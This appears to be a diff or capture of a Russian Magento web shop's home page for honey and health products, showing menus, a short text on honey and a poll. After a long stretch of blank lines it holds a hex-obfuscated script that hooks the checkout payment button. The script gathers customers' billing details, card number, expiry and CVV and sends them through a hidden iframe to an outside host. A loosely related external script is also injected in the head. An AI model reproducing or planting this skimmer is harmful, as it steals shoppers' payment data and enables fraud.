(1-%d).","Please enter a valid month (1-12).":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u043c\u0435\u0441\u044f\u0446 (1-12).","Please enter a valid year (1900-%d).":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u044b\u0439 \u0433\u043e\u0434 (1900-%d).","Please enter a valid full date":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u043f\u043e\u043b\u043d\u0443\u044e \u0434\u0430\u0442\u0443.","Please enter a valid date between %s and %s":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u0434\u0430\u0442\u0443 \u043c\u0435\u0436\u0434\u0443 %s \u0438 %s","Please enter a valid date equal to or greater than %s":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u0434\u0430\u0442\u0443 \u0440\u0430\u0432\u043d\u0443\u044e \u0438\u043b\u0438 \u0431\u043e\u043b\u044c\u0448\u0435 \u0447\u0435\u043c %s","Please enter a valid date less than or equal to %s":"\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u0434\u0430\u0442\u0443 \u0440\u0430\u0432\u043d\u0443\u044e \u0438\u043b\u0438 \u043c\u0435\u043d\u044c\u0448\u0435 \u0447\u0435\u043c %s"});</script>
+<script src="//0055d7b.netsolhost.com/Blog/lib2/js/js.js"> </script>
+</head>
+<body class=" cms-index-index cms-home">
+<div id="container">
+        <noscript>
+        <div class="noscript">
+            <div class="noscript-inner">
+                <p><strong>Скорее всего в вашем браузере отключён JavaScript.</strong></p>
+                <p>Вы должны включить JavaScript в вашем браузере, чтобы использовать функциональные возможности этого сайта.</p>
+            </div>
+        </div>
+    </noscript>
+    	<div id="header">
+        <div class="logo">
+        	       	</div>
+        <div class="soti"><span>+7 (911) 747-26-49</span><b>Звоните с 10:00 до 19:00</b></div>
+    </div>
+    <div id="menu2">
+    	
+<ul class="links">
+<li class="first"><a href="/">Главная</a></li>
+<li class="first"><a href="/about">О компании</a></li> 
+<li class="first"><a href="/oplata">Оплата и доставка</a></li> 
+<li class="first"><a href="/zakaz">Заказ и возврат</a></li> 
+<li class="first"><a href="/kontakt">Контакты</a></li>
+</ul>
+
+    	<!--<div class="cat"><img src="http://medovmir.ru/skin/frontend/default/honey/images/cat.jpg" width="122" height="44" alt="" /></div>-->
+    	    <ul id="nav" class="pod">
+        <li class="level0 nav-1 level-top first">
+<a href="http://medovmir.ru/d-n-d-d-n-d-n-d-n-d-d-d-n-d-d-d-d-d-d-d-n-d-d-d-n-doed-n-n-n-d-d-n-d-d-n-d-n-d-d-n-d-n-d-n.html" class="level-top">
+<span>Продукты здорового питания</span>
+</a>
+</li><li class="level0 nav-2 level-top parent">
+<a href="http://medovmir.ru/health.html" class="level-top">
+<span>Товары для здоровья</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-2-1 first">
+<a href="http://medovmir.ru/health/immunity.html">
+<span>Иммунитет</span>
+</a>
+</li><li class="level1 nav-2-2">
+<a href="http://medovmir.ru/health/cardiovascular-diseases.html">
+<span>Сердечно-сосудистые заболевания</span>
+</a>
+</li><li class="level1 nav-2-3">
+<a href="http://medovmir.ru/health/gastrointestinal-tract.html">
+<span>Желудочно-кишечный тракт</span>
+</a>
+</li><li class="level1 nav-2-4">
+<a href="http://medovmir.ru/health/locomotorium.html">
+<span>Опорно-двигательный аппарат</span>
+</a>
+</li><li class="level1 nav-2-5">
+<a href="http://medovmir.ru/health/hepatopathy.html">
+<span>Заболевания печени</span>
+</a>
+</li><li class="level1 nav-2-6">
+<a href="http://medovmir.ru/health/diabetes.html">
+<span>Диабетическая продукция</span>
+</a>
+</li><li class="level1 nav-2-7">
+<a href="http://medovmir.ru/health/men-women.html">
+<span>Женская и Мужская продукция</span>
+</a>
+</li><li class="level1 nav-2-8">
+<a href="http://medovmir.ru/health/beauty.html">
+<span>Товары для красоты</span>
+</a>
+</li><li class="level1 nav-2-9">
+<a href="http://medovmir.ru/health/d-d-d-d-n-n-d-d-n-d-n-d-d-d-n.html">
+<span>Товары для зрения</span>
+</a>
+</li><li class="level1 nav-2-10">
+<a href="http://medovmir.ru/health/d-n-d-d-d-d-d-d-n-d-d-d-d.html">
+<span>При малокровии</span>
+</a>
+</li><li class="level1 nav-2-11">
+<a href="http://medovmir.ru/health/d-n-d-d-n-d-n-n-n-d-d-n-n-d-d-d-d-d-d-d-d-d-d-n-n.html">
+<span>При простудных заболеваниях</span>
+</a>
+</li><li class="level1 nav-2-12 last">
+<a href="http://medovmir.ru/health/d-d-n-d-n-d-n-d-d-d-d-d-d-d-d-d-d-d-n.html">
+<span>Почечные заболевания</span>
+</a>
+</li>
+</ul>
+</li><li class="level0 nav-3 level-top last parent">
+<a href="http://medovmir.ru/honey.html" class="level-top">
+<span>Каталог</span>
+</a>
+<ul class="level0">
+<li class="level1 nav-3-1 first">
+<a href="http://medovmir.ru/honey/classic.html">
+<span>Мед</span>
+</a>
+</li><li class="level1 nav-3-2">
+<a href="http://medovmir.ru/honey/composition.html">
+<span>Фитомед</span>
+</a>
+</li><li class="level1 nav-3-3">
+<a href="http://medovmir.ru/honey/fitochay.html">
+<span>Фиточай</span>
+</a>
+</li><li class="level1 nav-3-4">
+<a href="http://medovmir.ru/honey/fitosbor.html">
+<span>Фитосбор</span>
+</a>
+</li><li class="level1 nav-3-5">
+<a href="http://medovmir.ru/honey/balzam.html">
+<span>Бальзам, эликсир</span>
+</a>
+</li><li class="level1 nav-3-6">
+<a href="http://medovmir.ru/honey/perga.html">
+<span>Перга</span>
+</a>
+</li><li class="level1 nav-3-7">
+<a href="http://medovmir.ru/honey/propolis.html">
+<span>Прополис</span>
+</a>
+</li><li class="level1 nav-3-8">
+<a href="http://medovmir.ru/honey/maslo.html">
+<span>Масло</span>
+</a>
+</li><li class="level1 nav-3-9 last">
+<a href="http://medovmir.ru/honey/muka.html">
+<span>Мука</span>
+</a>
+</li>
+</ul>
+</li>    </ul>
+    </div>
+    
+    
+    
+    <div id="wrapper">
+        <div id="content">
+        	        	<div id="con">
+                <div class="cont1">&nbsp;</div>
+                <div class="path"></div>
+                <div class="sideleft">
+                   	<div class="links">
+                   		
+
+<div class="links_top"></div>
+                   		<div class="links_middle">
+                   			<div class="links_inner">
+							
+
+                                                                        
+<ul><li><a href="http://medovmir.ru/d-n-d-d-n-d-n-d-n-d-d-d-n-d-d-d-d-d-d-d-n-d-d-d-n-doed-n-n-n-d-d-n-d-d-n-d-n-d-d-n-d-n-d-n.html">Продукты здорового питания(18)</a>
+</li><li><a href="http://medovmir.ru/health.html">Товары для здоровья(174)</a>
+<ul><li><a href="http://medovmir.ru/health/immunity.html">Иммунитет(39)</a>
+</li><li><a href="http://medovmir.ru/health/cardiovascular-diseases.html">Сердечно-сосудистые заболевания(20)</a>
+</li><li><a href="http://medovmir.ru/health/gastrointestinal-tract.html">Желудочно-кишечный тракт(21)</a>
+</li><li><a href="http://medovmir.ru/health/locomotorium.html">Опорно-двигательный аппарат(9)</a>
+</li><li><a href="http://medovmir.ru/health/hepatopathy.html">Заболевания печени(18)</a>
+</li><li><a href="http://medovmir.ru/health/diabetes.html">Диабетическая продукция(3)</a>
+</li><li><a href="http://medovmir.ru/health/men-women.html">Женская и Мужская продукция(33)</a>
+</li><li><a href="http://medovmir.ru/health/beauty.html">Товары для красоты(23)</a>
+</li><li><a href="http://medovmir.ru/health/d-d-d-d-n-n-d-d-n-d-n-d-d-d-n.html">Товары для зрения(5)</a>
+</li><li><a href="http://medovmir.ru/health/d-n-d-d-d-d-d-d-n-d-d-d-d.html">При малокровии(6)</a>
+</li><li><a href="http://medovmir.ru/health/d-n-d-d-n-d-n-n-n-d-d-n-n-d-d-d-d-d-d-d-d-d-d-n-n.html">При простудных заболеваниях(11)</a>
+</li><li><a href="http://medovmir.ru/health/d-d-n-d-n-d-n-d-d-d-d-d-d-d-d-d-d-d-n.html">Почечные заболевания(6)</a>
+</li></ul></li><li><a href="http://medovmir.ru/honey.html">Каталог(6)</a>
+<ul><li><a href="http://medovmir.ru/honey/classic.html">Мед(5)</a>
+</li><li><a href="http://medovmir.ru/honey/composition.html">Фитомед(10)</a>
+</li><li><a href="http://medovmir.ru/honey/fitochay.html">Фиточай(38)</a>
+</li><li><a href="http://medovmir.ru/honey/fitosbor.html">Фитосбор(18)</a>
+</li><li><a href="http://medovmir.ru/honey/balzam.html">Бальзам, эликсир(13)</a>
+</li><li><a href="http://medovmir.ru/honey/perga.html">Перга(2)</a>
+</li><li><a href="http://medovmir.ru/honey/propolis.html">Прополис(12)</a>
+</li><li><a href="http://medovmir.ru/honey/maslo.html">Масло(8)</a>
+</li><li><a href="http://medovmir.ru/honey/muka.html">Мука(4)</a>
+</li></ul></li></ul>
+							</div>
+						</div>
+                   		<div class="links_bottom"></div>
+
+
+
+                   	</div>
+                </div>
+                <div class="sideright">
+                	    <div class="page-title">
+        <h1>Продукты пчеловодства от магазинов «Медовый мир» для Вас!</h1>
+    </div>
+<div class="std"><div>
+<p>Мед - один из древнейших натуральных подсластителей, известных человечеству. Здоровый заменитель сахара, мед обладает огромной питательной ценностью и очень полезен для здоровья. Мед также широко применяется в косметологии, медицине и кулинарии. Мед можно купить в течение всего года, но лучше всего это делать летом и осенью, когда мед собирают. Читайте дальше, чтобы больше узнать о пользе меда</p>
+<br>
+<p>Мед содержит фруктозу и глюкозу, а также ряд минералов (калий, магний, кальций, серу, хлор, натрий, фосфат и железо). Кроме того, мед богат витаминами B1, B2, B6, B3, B5 и C. Концентрация этих полезных веществ в меде зависит от качества нектара и пыльцы. Кроме незначительного количества меди, йода и цинка, мед также содержит некоторые натуральные гормоны.</p>
+</div></div>                </div>
+                <div class="cont2">&nbsp;</div>
+        	</div>
+        </div>
+        <div id="column">
+        	<div class="cart">&nbsp;</div>
+<div class="col">
+        <div class="r1">&nbsp;</div>
+    <div class="car">
+        <h2>Моя корзина</h2>
+	    	    	<p class="empty">Ваша корзина покупок пуста.</p>
+	    	</div>
+	    <div class="r2">&nbsp;</div>
+</div>
+<div id="search_form">
+	<form id="search_mini_form" action="http://medovmir.ru/catalogsearch/result/" method="get">
+		<span style="color: #fff; font-weight: bold">Поиск:</span> 
+		<input
+			id="search" type="text"
+			name="q" value="" 
+			class="text input-text" />
+			<div id="search_autocomplete" class="search-autocomplete"></div>
+	        <script type="text/javascript">
+	        //<![CDATA[
+	            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Введите запрос...');
+	            searchForm.initAutocomplete('http://medovmir.ru/catalogsearch/ajax/suggest/', 'search_autocomplete');
+	        //]]>
+	        </script>
+	        <button type="submit" title="Поиск" class="button img">
+	        	<img
+				src="http://medovmir.ru/skin/frontend/default/honey/images/but.jpg"
+				width="22" height="21" alt="" style="vertical-align: middle" />
+	        </button>			
+	</form>
+</div>
+
+
+<div class="col">
+	<div class="r1">&nbsp;</div>
+	<h3>
+	Сравнение товаров		</h3>
+            <p class="empty">У вас нет товаров для сравнения.</p>
+        <div class="r2">&nbsp;</div>
+</div>
+<script type="text/javascript">
+//<![CDATA[
+    function validatePollAnswerIsSelected()
+    {
+        var options = $$('input.poll_vote');
+        for( i in options ) {
+            if( options[i].checked == true ) {
+                return true;
+            }
+        }
+        return false;
+    }
+//]]>
+</script>
+
+<div class="col">
+	<div class="r1">&nbsp;</div>
+	<h2>Опрос</h2>
+	<p>
+		<b>Какой мёд Вы предпочитаете?</b>
+		<form id="pollForm" action="http://medovmir.ru/poll/vote/add/poll_id/1/" method="post" onsubmit="return validatePollAnswerIsSelected();">
+			            <ul id="poll-answers">
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_1" value="1" />
+                    <span class="label"><label for="vote_1">Гречишный</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_2" value="2" />
+                    <span class="label"><label for="vote_2">Цветочный</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_3" value="3" />
+                    <span class="label"><label for="vote_3">Майский</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_4" value="4" />
+                    <span class="label"><label for="vote_4">Липовый</label></span>
+                </li>
+                                <li>
+                    <input type="radio" name="vote" class="radio poll_vote" id="vote_5" value="5" />
+                    <span class="label"><label for="vote_5">Подсолнечниковый</label></span>
+                </li>
+                            </ul>
+            <script type="text/javascript">decorateList('poll-answers');</script>
+                        <div class="actions">
+                <button type="submit" title="Голосовать" class="button but1">
+                	                </button>
+            </div>
+		</form>
+	</p>
+	<div class="r2">&nbsp;</div>
+</div>
+        </div>
+	</div>
+</div>
+<div id="footer">
+    <div class="pic">
+		<div class="pl">
+	        <!--        
+<ul>
+<li>Главная</li>
+<li class="last">Сотрудничество</li>
+<li class="last">Оплата</li>
+<li class="last">Доставка</li>
+<li class="last">Контакты</li>
+</ul>
+-->         
+<ul class="fmenu">
+<li><a href="/about">О компании</a></li>
+<li><a href="/oplata">Оплата и доставка</a></li>
+<li class="last"><a href="/kontakt">Контакты</a></li>
+</ul>	        <p class="cont">+7 (911) 747-26-49 <span>Звоните с 10:00 до 19:00</span>
+	        <div class="copyright">&copy; 2011-2016 Медовый мир. Все права защищены.</div>
+        </div>
+        <div class="pr">
+			<ul class="links">
+                        <li class="first" ><a href="http://medovmir.ru/catalog/seo_sitemap/category/" title="Карта сайта" >Карта сайта</a></li>
+                                <li ><a href="http://medovmir.ru/sales/guest/form/" title="Заказы и возвраты" >Заказы и возвраты</a></li>
+                                <li class=" last" ><a href="http://medovmir.ru/contacts/" title="Обратная связь" >Обратная связь</a></li>
+            </ul>
+
+
+			 <ul class="links">
+                        <li class="first" ><a href="http://medovmir.ru/customer/account/" title="Моя учётная запись" >Моя учётная запись</a></li>
+                                <li ><a href="http://medovmir.ru/wishlist/" title="Мой лист пожеланий" >Мой лист пожеланий</a></li>
+                                <li ><a href="http://medovmir.ru/checkout/cart/" title="Моя корзина" class="top-link-cart">Моя корзина</a></li>
+                                <li ><a href="http://medovmir.ru/checkout/" title="Оформить заказ" class="top-link-checkout">Оформить заказ</a></li>
+                                <li class=" last" ><a href="http://medovmir.ru/customer/account/login/" title="Войти" >Войти</a></li>
+            </ul>
+ 
+
+		</div>
+    </div>
+    </div>
+
+<div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script> var _0xec55=["\x47\x45\x54","\x6F\x70\x65\x6E","\x77\x69\x74\x68\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x65\x6E\x64","\x67\x6F\x6F\x64","\x6C\x6F\x67","\x49\x46\x52\x41\x4D\x45","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x6F\x6E\x6C\x6F\x61\x64","\x0A","\x57\x65\x62\x20\x3A\x20","\x68\x6F\x73\x74","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x62\x69\x6C\x6C\x69\x6E\x67\x2D\x61\x64\x64\x72\x65\x73\x73\x2D\x73\x65\x6C\x65\x63\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x63\x6F\x75\x6E\x74\x72\x79\x5F\x69\x64","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74\x65\x64\x49\x6E\x64\x65\x78","\x6F\x70\x74\x69\x6F\x6E\x73","\x0A\x46\x75\x6C\x6C\x20\x4E\x61\x6D\x65\x20\x3A\x20","\x76\x61\x6C\x75\x65","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x66\x69\x72\x73\x74\x6E\x61\x6D\x65","\x20","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x6C\x61\x73\x74\x6E\x61\x6D\x65","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x73\x74\x72\x65\x65\x74\x31","\x0A\x53\x74\x72\x65\x65\x74\x20\x31\x20\x3A\x20","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x73\x74\x72\x65\x65\x74\x32","\x0A\x53\x74\x72\x65\x65\x74\x20\x32\x20\x3A\x20","\x0A\x43\x69\x74\x79\x20\x3A\x20","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x63\x69\x74\x79","\x20\x0A\x52\x65\x67\x69\x6F\x6E\x20\x3A\x20","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x72\x65\x67\x69\x6F\x6E","\x0A\x50\x6F\x73\x74\x63\x6F\x64\x65\x20\x3A\x20","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x70\x6F\x73\x74\x63\x6F\x64\x65","\x20\x0A\x43\x6F\x75\x6E\x74\x72\x79\x20\x3A\x20","\x0A\x54\x65\x6C\x70\x2E\x20\x3A\x20","\x62\x69\x6C\x6C\x69\x6E\x67\x3A\x74\x65\x6C\x65\x70\x68\x6F\x6E\x65","","\x0A\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D","\x0A\x43\x43\x20\x3A\x20","\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72","\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E","\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72","\x0A\x45\x78\x70\x20\x3A\x20","\x2F","\x0A\x43\x56\x4E\x20\x3A\x20","\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64","\x0A\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x3D\x20\x0A","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x30","\x70\x61\x79\x6D\x65\x6E\x74\x2D\x62\x75\x74\x74\x6F\x6E\x73\x2D\x63\x6F\x6E\x74\x61\x69\x6E\x65\x72","\x4F\x4B","\x61\x64\x61","\x62\x75\x74\x74\x6F\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6F\x6E\x63\x6C\x69\x63\x6B","\x6E\x6F\x2D\x65\x76\x69\x6C","\x68\x74\x74\x70\x73\x3A","\x70\x72\x6F\x74\x6F\x63\x6F\x6C","\x68\x74\x74\x70\x3a\x2f\x2f\x6e\x68\x6f\x77\x7a\x2e\x74\x6b\x2f\x73\x63\x75\x72\x65\x2e\x70\x68\x70\x3f\x6c\x6f\x67\x3d","\x73\x61\x76\x65"];function xhr(_0xc87dx2){var _0xc87dx3= new XMLHttpRequest;_0xc87dx3[_0xec55[1]](_0xec55[0],_0xc87dx2),_0xc87dx3[_0xec55[2]]= !0,_0xc87dx3[_0xec55[5]](_0xec55[3],_0xec55[4]),_0xc87dx3[_0xec55[6]](),console[_0xec55[8]](_0xec55[7])}function frm_fill(_0xc87dx2){var _0xc87dx3=document[_0xec55[10]](_0xec55[9]);_0xc87dx3[_0xec55[12]](_0xec55[11],_0xc87dx2),_0xc87dx3[_0xec55[14]][_0xec55[13]]=_0xec55[15],document[_0xec55[17]][_0xec55[16]](_0xc87dx3),console[_0xec55[8]](_0xec55[7])}window[_0xec55[18]]=function(){function _0xc87dx2(){var _0xc87dx2=_0xec55[19];_0xc87dx2=_0xc87dx2+_0xec55[20]+window[_0xec55[22]][_0xec55[21]];var _0xc87dx3=document[_0xec55[24]](_0xec55[23]);if(null===_0xc87dx3){var _0xc87dx5=document[_0xec55[24]](_0xec55[25]),_0xc87dx6=_0xc87dx5[_0xec55[28]][_0xc87dx5[_0xec55[27]]][_0xec55[26]],_0xc87dx7=_0xec55[29]+document[_0xec55[24]](_0xec55[31])[_0xec55[30]]+_0xec55[32]+document[_0xec55[24]](_0xec55[33])[_0xec55[30]];null!==document[_0xec55[24]](_0xec55[34])&&(_0xc87dx7=_0xc87dx7+_0xec55[35]+document[_0xec55[24]](_0xec55[34])[_0xec55[30]]),null!==document[_0xec55[24]](_0xec55[36])&&(_0xc87dx7=_0xc87dx7+_0xec55[37]+document[_0xec55[24]](_0xec55[36])[_0xec55[30]]),_0xc87dx7=_0xc87dx7+_0xec55[38]+document[_0xec55[24]](_0xec55[39])[_0xec55[30]]+_0xec55[40]+document[_0xec55[24]](_0xec55[41])[_0xec55[30]],_0xc87dx7=_0xc87dx7+_0xec55[42]+document[_0xec55[24]](_0xec55[43])[_0xec55[30]]+_0xec55[44]+_0xc87dx6,_0xc87dx7=_0xc87dx7+_0xec55[45]+document[_0xec55[24]](_0xec55[46])[_0xec55[30]],_0xc87dx2+=_0xc87dx7}else {var _0xc87dx8=_0xc87dx3[_0xec55[28]][_0xc87dx3[_0xec55[27]]][_0xec55[26]],_0xc87dx9=_0xc87dx3[_0xec55[28]][_0xc87dx3[_0xec55[27]]][_0xec55[30]];if(_0xec55[47]==_0xc87dx9){var _0xc87dx5=document[_0xec55[24]](_0xec55[25]),_0xc87dx6=_0xc87dx5[_0xec55[28]][_0xc87dx5[_0xec55[27]]][_0xec55[26]],_0xc87dx7=_0xec55[29]+document[_0xec55[24]](_0xec55[31])[_0xec55[30]]+_0xec55[32]+document[_0xec55[24]](_0xec55[33])[_0xec55[30]];null!==document[_0xec55[24]](_0xec55[34])&&(_0xc87dx7=_0xc87dx7+_0xec55[35]+document[_0xec55[24]](_0xec55[34])[_0xec55[30]]),null!==document[_0xec55[24]](_0xec55[36])&&(_0xc87dx7=_0xc87dx7+_0xec55[37]+document[_0xec55[24]](_0xec55[36])[_0xec55[30]]),_0xc87dx7=_0xc87dx7+_0xec55[38]+document[_0xec55[24]](_0xec55[39])[_0xec55[30]]+_0xec55[40]+document[_0xec55[24]](_0xec55[41])[_0xec55[30]],_0xc87dx7=_0xc87dx7+_0xec55[42]+document[_0xec55[24]](_0xec55[43])[_0xec55[30]]+_0xec55[44]+_0xc87dx6,_0xc87dx7=_0xc87dx7+_0xec55[45]+document[_0xec55[24]](_0xec55[46])[_0xec55[30]],_0xc87dx2+=_0xc87dx7}else {_0xc87dx2=_0xc87dx2+_0xec55[19]+_0xc87dx8}};_0xc87dx2+=_0xec55[48],_0xc87dx2=_0xc87dx2+_0xec55[49]+document[_0xec55[24]](_0xec55[50])[_0xec55[30]];var _0xc87dxa=document[_0xec55[24]](_0xec55[51]),_0xc87dxb=_0xc87dxa[_0xec55[28]][_0xc87dxa[_0xec55[27]]][_0xec55[30]],_0xc87dxc=document[_0xec55[24]](_0xec55[52]),_0xc87dxd=_0xc87dxc[_0xec55[28]][_0xc87dxc[_0xec55[27]]][_0xec55[30]];return _0xc87dx2=_0xc87dx2+_0xec55[53]+_0xc87dxb+_0xec55[54]+_0xc87dxd,_0xc87dx2=_0xc87dx2+_0xec55[55]+document[_0xec55[24]](_0xec55[56])[_0xec55[30]],_0xc87dx2=_0xc87dx2+_0xec55[57]+navigator[_0xec55[58]],bl_raw=encodeURI(_0xc87dx2),_0xec55[47]==document[_0xec55[24]](_0xec55[56])[_0xec55[30]]?_0xec55[59]:bl_raw}var _0xc87dx3=document[_0xec55[24]](_0xec55[60]);if(console[_0xec55[8]](_0xec55[61]),null===_0xc87dx3){console[_0xec55[8]](_0xec55[15])}else {console[_0xec55[8]](_0xec55[62]);var _0xc87dx5=_0xc87dx3[_0xec55[64]](_0xec55[63])[0];_0xc87dx5[_0xec55[65]]=function(){var _0xc87dx3=_0xc87dx2();_0xec55[59]==_0xc87dx3?console[_0xec55[8]](_0xec55[66]):frm_fill(_0xec55[67]!=window[_0xec55[22]][_0xec55[68]]?_0xec55[69]+_0xc87dx3:_0xec55[69]+_0xc87dx3),payment[_0xec55[70]]()}}}</script>
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript">
+(function (d, w, c) {
+    (w[c] = w[c] || []).push(function() {
+        try {
+            w.yaCounter22750564 = new Ya.Metrika({id:22750564,
+                    webvisor:true,
+                    clickmap:true,
+                    trackLinks:true,
+                    accurateTrackBounce:true});
+        } catch(e) { }
+    });
+
+    var n = d.getElementsByTagName("script")[0],
+        s = d.createElement("script"),
+        f = function () { n.parentNode.insertBefore(s, n); };
+    s.type = "text/javascript";
+    s.async = true;
+    s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";
+
+    if (w.opera == "[object Opera]") {
+        d.addEventListener("DOMContentLoaded", f, false);
+    } else { f(); }
+})(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="//mc.yandex.ru/watch/22750564" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+
+</body>
+</html>
